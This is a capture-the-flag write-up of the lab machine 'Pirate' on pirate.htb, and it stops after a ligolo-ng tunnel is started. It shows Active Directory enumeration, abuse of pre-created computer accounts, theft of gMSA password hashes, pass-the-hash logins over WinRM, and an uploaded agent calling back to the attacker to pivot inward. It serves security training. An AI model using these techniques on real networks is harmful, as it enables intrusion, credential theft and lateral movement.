# Machine Description
As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&

```python
pentest:p3nt3st2025!&
```

# Host file setup
```python
sudo nxc smb 10.129.244.95 --generate-hosts-file /etc/hosts  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.244.95 -vv

Nmap scan report for 10.129.244.95
Host is up, received user-set (0.014s latency).
Scanned at 2026-09-24 16:27:34 BST for 66s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49683/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49686/tcp open  unknown          syn-ack
49689/tcp open  unknown          syn-ack
49913/tcp open  unknown          syn-ack
49936/tcp open  unknown          syn-ack
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,5985 -A --min-rate=2000 -sT -Pn dc01.pirate.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 16:30 +0100
Nmap scan report for dc01.pirate.htb (10.129.244.95)
Host is up (0.014s latency).
rDNS record for 10.129.244.95: DC01.pirate.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 22:30:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-24T22:17:27
|_Not valid after:  2027-09-24T22:17:27
|_ssl-date: 2026-09-24T22:31:40+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled but cannot use it to enumerate

The guest account is also disabled

## Using provided credentials
```python
nxc smb dc01.pirate.htb -u pentest -p 'p3nt3st2025!&'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
```

These credentials allow me to authenticate

### Shares
```python
nxc smb dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' --shares
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
SMB         10.129.244.95   445    DC01             [*] Enumerated shares
SMB         10.129.244.95   445    DC01             Share           Permissions     Remark
SMB         10.129.244.95   445    DC01             -----           -----------     ------
SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.244.95   445    DC01             C$                              Default share
SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share
```

Just default shares

### Users
```python
nxc smb dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
a.white_adm
a.white
WEB01$
MS01$
EXCH01$
gMSA_ADCS_prod$
pentest
gMSA_ADFS_prod$
j.sparrow
```

Ill use `--rid-brute` to also get machine accounts

# Pre 2000 computer accounts

```python
nxc ldap dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for ms01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
PRE2K       10.129.244.95   389    DC01             [-] Failed to get TGT for exch01@pirate.htb: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

After seeing several machine accounts, i figured it was worth checking, looks like there is

However nxc is unable to get TGTs cause of the clock skew which is fine since i should be able to guess their password based off their username

```python
nxc smb dc01.pirate.htb -u 'ms01$' -p 'ms01'                  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [-] pirate.htb\ms01$:ms01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

nxc smb dc01.pirate.htb -u 'exch01$' -p 'exch01'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [-] pirate.htb\exch01$:exch01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

Both credentials are valid however i am not authorized to use these credentials to logon

```python
faketime -f +7h nxc ldap dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' -M pre2k
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
```

However re-running the previous command while syncing to the time it will get some TGTs for me

```python
faketime -f +7h nxc smb dc01.pirate.htb --use-kcache
SMB         dc01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\exch01 from ccache

faketime -f +7h nxc smb dc01.pirate.htb --use-kcache
SMB         dc01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\ms01 from ccache
```

Both allow me to authenticate

# Compromising `gMSA_ADCS_prod$` and `gMSA_ADFS_prod$`

```python
faketime -f +7h nxc ldap dc01.pirate.htb --use-kcache --gmsa
LDAP        dc01.pirate.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never) 
LDAP        dc01.pirate.htb 389    DC01             [+] PIRATE.HTB\ms01 from ccache 
LDAP        dc01.pirate.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADCS_prod$      NTLM: aa831d274ee80cf2092f68cbcf29093e     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$      NTLM: e819498ec29f595382df1eaf4fb42307     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

I have both NT hashes for both of these accounts

```python
nxc smb dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'e819498ec29f595382df1eaf4fb42307'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307

nxc smb dc01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e
```

Both users compromised!

# Access over WINRM 

```python
nxc winrm dc01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e (Pwn3d!)

nxc winrm dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'e819498ec29f595382df1eaf4fb42307'
WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) 
WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307 (Pwn3d!)
```

Both accounts can authenticate

```python
evil-winrm-py -i dc01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc01.pirate.htb:5985' as 'gMSA_ADCS_prod$'
evil-winrm-py PS C:\Users\gMSA_ADCS_prod$\Documents>
```

```python
evil-winrm-py PS C:\Program Files\Hyper-V> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.244.95
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
evil-winrm-py PS C:\Program Files\Hyper-V> ping 192.168.100.2

Pinging 192.168.100.2 with 32 bytes of data:
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
```

Looks like there is another host

Ill get ligolo-ng setup to access the internal host

# Setting up ligolo-ng

https://github.com/nicocha30/ligolo-ng/releases

```python
evil-winrm-py PS C:\Temp> upload agent.exe .
Uploading /home/kali/htb/pirate/agent.exe: 7.06MB [00:14, 503kB/s]                                           
[+] File uploaded successfully as: C:\Temp\agent.exe
evil-winrm-py PS C:\Temp>
```

Ill get the agent uploaded to the target

```python
sudo ./proxy -selfcert
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.1

ligolo-ng »
```

ill start the proxy on my system

```python
evil-winrm-py PS C:\Temp> ./agent.exe -connect 10.10.14.61:11601 --ignore-cert --retry
```

Ill then trigger a connection back to me

```python
ligolo-ng » session
? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.244.95:59484 - 00155d0bd000
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » 
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » 
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » ifcreate --name ligolo
INFO[0098] Creating a new ligolo interface...           
INFO[0098] Interface created!                           
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » route_add --name ligolo --route 192.168.100.0/24
INFO[0158] Route created.                               
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » tunnel_start 
INFO[0166] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000) 
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] »
```

ill then select the new session create the interface and add the new routing info, then start the tunnel





